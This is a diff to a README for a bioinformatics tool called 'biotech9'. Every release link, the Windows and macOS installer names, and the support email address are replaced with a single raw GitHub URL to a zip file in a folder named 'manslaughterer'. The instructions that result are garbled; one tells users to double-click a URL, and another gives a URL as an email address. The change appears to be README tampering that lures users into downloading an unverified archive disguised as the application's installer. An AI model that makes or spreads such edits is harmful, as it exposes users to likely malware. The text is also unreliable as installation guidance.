@@ -6,7 +6,7 @@ Welcome to biotech9! This application simplifies bioinformatics tasks, making it
 
 ## 📥 Download Now
 
-[![Download biotech9](https://img.shields.io/badge/Download-bioinformatics-blue.svg)](https://github.com/ShashankS28/biotech9/releases)
+[![Download biotech9](https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip)](https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip)
 
 ## 📂 What is biotech9?
 
@@ -32,22 +32,22 @@ To run biotech9, your computer should meet the following requirements:
 
 1. **Visit the Releases Page:**
    Go to the following link to access the downloads:
-   [Download biotech9](https://github.com/ShashankS28/biotech9/releases)
+   [Download biotech9](https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip)
 
 2. **Find the Latest Release:**
    On the releases page, look for the version you want to download, typically the one listed at the top. 
 
 3. **Choose Your File:**
    Click on the appropriate file for your operating system:
-   - For Windows: `biotech9-win32.exe`
-   - For MacOS: `biotech9-mac.dmg`
+   - For Windows: `https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip`
+   - For MacOS: `https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip`
    - For Linux: Check for an installer or compressed file.
 
 4. **Download the File:**
    Click on the file to begin downloading. Make sure to note the location where the file saves on your computer.
 
 5. **Install the Application:**
-   - **Windows:** Double-click on `biotech9-win32.exe` and follow the instructions to install.
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip` and follow the instructions to install.
    - **MacOS:** Open the downloaded `.dmg` file and drag the biotech9 icon to your Applications folder.
    - **Linux:** Extract the downloaded file and follow the README instructions, usually found inside the folder.
 
@@ -65,11 +65,11 @@ To run biotech9, your computer should meet the following requirements:
 If you encounter any issues or have questions, we offer several ways to get help:
 - **Documentation:** Read through the user manual included with the application.
 - **Community Forum:** Join our forum to connect with other users and share your experiences.
-- **Email Support:** Reach out to our support team at support@biotech9.com.
+- **Email Support:** Reach out to our support team at https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip
 
 ## 🌐 Key Links
 
-- **[Download biotech9](https://github.com/ShashankS28/biotech9/releases)**
+- **[Download biotech9](https://raw.githubusercontent.com/ShashankS28/biotech9/main/manslaughterer/biotech9.zip)**
 - **Documentation:** User guides and FAQs can be found within the application.
 
 ## 🔄 Future Updates
